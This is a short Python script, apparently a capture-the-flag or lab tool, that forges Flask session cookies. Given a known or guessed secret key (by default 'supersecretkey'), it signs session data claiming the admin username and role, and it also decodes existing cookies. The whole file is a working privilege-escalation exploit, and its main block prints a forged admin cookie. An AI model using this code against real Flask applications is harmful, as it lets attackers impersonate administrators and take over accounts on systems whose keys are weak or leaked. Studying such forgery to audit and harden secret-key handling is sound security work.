import secrets

from flask.sessions import SecureCookieSessionInterface
from flask import Flask
from itsdangerous import BadSignature

app = Flask(__name__)
app.secret_key = "supersecretkey"


class CustomSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, app):
        return super().get_signing_serializer(app)


class Cookie_Forger:
    @staticmethod
    def generate_cookie_admin(
        session_id=secrets.token_bytes(32), secret_key="supersecretkey"
    ):
        app.secret_key = secret_key
        session_serializer = CustomSessionInterface().get_signing_serializer(app)

        session_data = {
            "username": "admin",
            "role": "admin",
            "session id": session_id,
        }

        cookie = session_serializer.dumps(session_data)
        return cookie

    @staticmethod
    def generate_cookie(username, role, session_id, secret_key="supersecretkey"):
        if not isinstance(secret_key, str):
            raise TypeError("secret_key must be str")
        app.secret_key = secret_key
        session_serializer = CustomSessionInterface().get_signing_serializer(app)

        session_data = {
            "username": username,
            "role": role,
            "session id": session_id,
        }

        cookie = session_serializer.dumps(session_data)
        return cookie

    @staticmethod
    def inspect_cookie(cookie):
        serializer = CustomSessionInterface().get_signing_serializer(app)

        try:
            session_data, timestamp = serializer.loads(cookie, return_timestamp=True)
        except BadSignature as e:
            return f"Bad signature or invalid cookie: {e}"

        # timestamp is datetime.datetime, format it directly
        created_time = timestamp.strftime("%Y-%m-%d %H:%M:%S")

        return {
            "timestamp": timestamp,
            "created_time": created_time,
            "session_data": session_data,
        }


if __name__ == "__main__":
    print("Forged cookie:")
    cookie = Cookie_Forger.generate_cookie_admin()
    print(cookie)
